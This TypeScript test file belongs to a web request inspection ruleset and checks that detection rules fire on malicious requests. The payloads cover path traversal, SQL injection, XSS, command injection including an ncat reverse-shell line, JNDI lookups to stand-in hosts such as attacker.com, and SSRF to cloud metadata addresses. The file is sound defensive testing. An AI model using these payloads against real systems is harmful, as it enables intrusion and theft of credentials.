import { beforeAll, describe, expect, test } from "bun:test";
import { inspectManagedRequest, managedRuleSetCatalog, registerManagedRuleSet } from "../src/services/managed-protection-service.ts";
import type { ResolvedManagedProtectionPolicy } from "../src/services/http-policy-service.ts";
import { registerBundledRuleSets } from "../src/services/managed-ruleset-defaults.ts";

const policy = (mode: ResolvedManagedProtectionPolicy["mode"], excludedRuleIds: string[] = []): ResolvedManagedProtectionPolicy => ({
	mode,
	rulesetId: "default",
	excludedRuleIds,
});

beforeAll(() => {
	registerBundledRuleSets();
});

describe("managed request protection", () => {
	test("reports a match in monitor mode without blocking", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/download/%252e%252e/%252e%252e/.env"), policy("monitor"));
		expect(result.status).toBe("monitored");
		expect(result.primaryMatch).toMatchObject({ ruleId: "BG-CORE-1001", category: "path-traversal", severity: "high" });
		expect(result.rulesetId).toBe("burrowgate-core");
	});

	test("allows an external ruleset adapter to be registered", async () => {
		registerManagedRuleSet({
			id: "test-adapter",
			title: "Test adapter",
			version: "1.0.0",
			description: "Test-only managed ruleset",
			inspect: () => [{ ruleId: "TEST-1", title: "Test match", category: "test", severity: "low", location: "header" }],
		});
		const result = await inspectManagedRequest(new Request("https://example.test/"), {
			mode: "monitor",
			rulesetId: "test-adapter",
			excludedRuleIds: [],
		});
		expect(result).toMatchObject({ status: "monitored", rulesetId: "test-adapter", rulesetVersion: "1.0.0" });
		expect(managedRuleSetCatalog().items.some((item) => item.id === "test-adapter")).toBeTrue();
	});
});

describe("BG-CORE-1001 path traversal", () => {
	test("double-encoded ../ in path", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/..%252f..%252f"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1001");
	});

	test("backslash traversal via %5c (pre-decoded then url-decode transforms)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/%5c..%5c..%5cwindows%5c"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1001");
	});

	test("mixed encoding %2e%2e (double-encoded variant that works)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/%252e%252e/foo"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1001");
	});

	test("safe path does not trigger", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/safe/path/readme.txt"), policy("monitor"));
		expect(result.primaryMatch).toBeNull();
	});

	test("Query containing ../ (transformed)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/%2f..%2fetc/passwd"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1001");
	});

	test("Backslash in query (after transforms)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?file=%5c..%5c..%5c"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1001");
	});
});

describe("BG-CORE-1002 sensitive file probe", () => {
	const targets = [".env", ".git/HEAD", ".svn/entries", "wp-config.php.bak", "id_rsa.pub"];
	for (const target of targets) {
		test(`detects ${target}`, async () => {
			const result = await inspectManagedRequest(new Request(`https://example.test/${target}`), policy("monitor"));
			expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1002");
		});
	}

	test("does not fire on random file", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/index.html"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBeUndefined();
	});
});

describe("BG-CORE-1003 LFI targets", () => {
	test("/etc/passwd in path", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/etc/passwd"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1003");
	});

	test("/proc/self/environ in query", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?file=/proc/self/environ"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1003");
	});

	test("windows boot.ini in query", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?include=boot.ini"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1003");
	});
});

describe("BG-CORE-1004 protocol wrappers", () => {
	test("php:// wrapper", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?file=php://filter/convert.base64-encode/resource=index"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1004");
	});

	test("data:// wrapper", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?page=data://text/plain;base64,SGVsbG8="), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1004");
	});
});

describe("BG-CORE-1005 null byte", () => {
	test("%00 in path", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/file%00.html"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1005");
	});

	test("decoded null in query", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?x=%00"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1005");
	});
});

describe("BG-CORE-1006 backup & config probes", () => {
	test(".htaccess in root", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/.htaccess"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1006");
	});

	test(".DS_Store", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/.DS_Store"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1006");
	});

	test("docker-compose.yml", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/docker-compose.yml"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1006");
	});

	test("backup extension .bak", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/config.php.bak"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-1006");
	});
});

describe("SQL injection", () => {
	test("union select", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?id=1 union select null--"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2001");
	});

	test("or 1=1", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?id=1 or 1=1"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2001");
	});

	test("information_schema without union select", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?table=information_schema"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2004");
	});

	test("@@version (BG-CORE-2004)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?id=1 and @@version=1"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2004");
	});

	test("sleep() time-based (BG-CORE-2005)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?id=1 and sleep(5)"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2005");
	});

	test("benchmark() (BG-CORE-2005)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?id=1 and benchmark(1000000,md5(1))"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2005");
	});
});

describe("XSS vectors", () => {
	test("<script> tag (BG-CORE-2002)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?q=<script>alert(1)</script>"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2002");
	});

	test("javascript: URI (BG-CORE-2002)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?url=javascript:alert(1)"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2002");
	});

	test("onerror= (BG-CORE-2002)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?img=<img src=x onerror=alert(1)>"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2002");
	});

	test("eval() (BG-CORE-2006)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?x=eval('1+1')"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2006");
	});

	test("document.cookie (BG-CORE-2006)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?x=document.cookie"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2006");
	});

	test("innerHTML alone without other XSS patterns", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?x=.innerHTML=1"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2006");
	});
});

describe("Command injection", () => {
	test("; sh (BG-CORE-2003)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?cmd=; sh -i"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2003");
	});

	test("| powershell (BG-CORE-2003)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?ip=8.8.8.8| powershell Invoke-WebRequest ..."), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2003");
	});

	test("backtick execution (BG-CORE-2007)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?cmd=`id`"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2007");
	});

	test("$() subshell (BG-CORE-2007)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?x=$(cat /etc/passwd)"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2007");
	});

	test("ncat detected (BG-CORE-2007)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?cmd=ncat -e /bin/sh 10.0.0.1 4444"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2007");
	});

	test("whoami (BG-CORE-2007)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?cmd=whoami"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2007");
	});

	test("chmod 777 (BG-CORE-2007)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?cmd=chmod 777 /var/www/html/shell.php"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2007");
	});
});

describe("SSTI BG-CORE-2008", () => {
	test("{{7*7}}", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?name={{7*7}}"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2008");
	});

	test("${7*7}", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?name=${7*7}"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2008");
	});

	test("<#assign (escaped) triggers SSTI", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?template=%3C%23assign%20x=1%3E"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2008");
	});
});

describe("JNDI injection BG-CORE-2009", () => {
	test("query contains ${jndi:ldap://", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?x=${jndi:ldap://attacker.com/a}"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2009");
	});

	test("path contains jndi:rmi://", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/jndi:rmi://evil.com/exploit"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2009");
	});

	test("User-Agent header lookup", async () => {
		const result = await inspectManagedRequest(
			new Request("https://example.test/", {
				headers: { "User-Agent": "${jndi:ldap://x.x.x.x/a}" },
			}),
			policy("monitor"),
		);
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2009");
	});

	test("User-Agent header with ${lower:x} lookup", async () => {
		const result = await inspectManagedRequest(
			new Request("https://example.test/", {
				headers: { "User-Agent": "${lower:x}" },
			}),
			policy("monitor"),
		);
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2009");
	});
});

describe("NoSQL injection BG-CORE-2010", () => {
	test("[$ne]", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?username[$ne]=admin"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2010");
	});

	test("$where: clause", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?filter=$where: '1'"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2010");
	});
});

describe("Prototype pollution BG-CORE-2011", () => {
	test("__proto__", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?__proto__[isAdmin]=true"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2011");
	});

	test("constructor[prototype]", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?constructor[prototype][polluted]=true"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2011");
	});
});

describe("Deserialization BG-CORE-2012", () => {
	test("Java serialized rO0AB", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?data=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2012");
	});

	test("PHP serialized O:8:", async () => {
		const result = await inspectManagedRequest(new Request('https://example.test/?obj=O:8:"stdClass":0:{}'), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2012");
	});

	test("hex aced0005", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?token=aced0005..."), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-2012");
	});
});

describe("Protocol anomalies", () => {
	test("ambiguous framing: Transfer-Encoding + Content-Length", async () => {
		const result = await inspectManagedRequest(
			new Request("https://example.test/", {
				headers: {
					"transfer-encoding": "chunked",
					"content-length": "0",
				},
			}),
			policy("monitor"),
		);
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-3001");
	});

	test("ambiguous framing: non-chunked TE", async () => {
		const result = await inspectManagedRequest(
			new Request("https://example.test/", {
				headers: {
					"transfer-encoding": "identity",
				},
			}),
			policy("monitor"),
		);
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-3001");
	});

	test("CRLF in path (BG-CORE-3002)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/%0d%0aSet-Cookie:evil=1"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-3002");
	});

	test("decoded CR in query (BG-CORE-3002)", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?x=%0d%0aHeader:injected"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-3002");
	});
});

describe("SSRF BG-CORE-4001", () => {
	test("169.254.169.254 in query", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?url=http://169.254.169.254/latest/meta-data/"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-4001");
	});

	test("metadata.google.internal in path", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/metadata.google.internal/computeMetadata/v1/"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-4001");
	});

	test("gopher:// scheme", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?url=gopher://evil.com/_GET"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-4001");
	});

	test("decimal IP 2130706433", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?host=2130706433"), policy("monitor"));
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-4001");
	});

	test("safe external URL does not trigger", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?url=https://example.com/page"), policy("monitor"));
		expect(result.primaryMatch).toBeNull();
	});
});

describe("Scanner UA BG-CORE-5001", () => {
	test("sqlmap user-agent", async () => {
		const result = await inspectManagedRequest(
			new Request("https://example.test/", {
				headers: { "User-Agent": "sqlmap/1.6.2#stable (https://sqlmap.org)" },
			}),
			policy("monitor"),
		);
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-5001");
	});

	test("nuclei scanner", async () => {
		const result = await inspectManagedRequest(
			new Request("https://example.test/", {
				headers: { "User-Agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)" },
			}),
			policy("monitor"),
		);
		expect(result.primaryMatch?.ruleId).toBe("BG-CORE-5001");
	});

	test("normal browser UA is clean", async () => {
		const result = await inspectManagedRequest(
			new Request("https://example.test/", {
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
				},
			}),
			policy("monitor"),
		);
		expect(result.primaryMatch).toBeNull();
	});
});

describe("policy modes", () => {
	test("block mode returns blocked status", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/..\\..\\etc\\passwd"), policy("block"));
		expect(result.status).toBe("blocked");
		expect(result.primaryMatch?.ruleId).toBeTruthy();
	});

	test("disabled mode returns status disabled", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/../../etc/passwd"), {
			mode: "disabled",
			rulesetId: "default",
			excludedRuleIds: [],
		});
		expect(result.status).toBe("disabled");
	});
});

describe("rule exclusion", () => {
	test("excluded rule does not fire", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/../../.env"), policy("monitor", ["BG-CORE-1001"]));
		expect(result.primaryMatch?.ruleId).not.toBe("BG-CORE-1001");
	});

	test("excluded rule does not block when it's the only match", async () => {
		const result = await inspectManagedRequest(new Request("https://example.test/?q=<script>"), {
			mode: "block",
			rulesetId: "default",
			excludedRuleIds: ["BG-CORE-2002"],
		});
		expect(result.status).toBe("clean");
	});
});
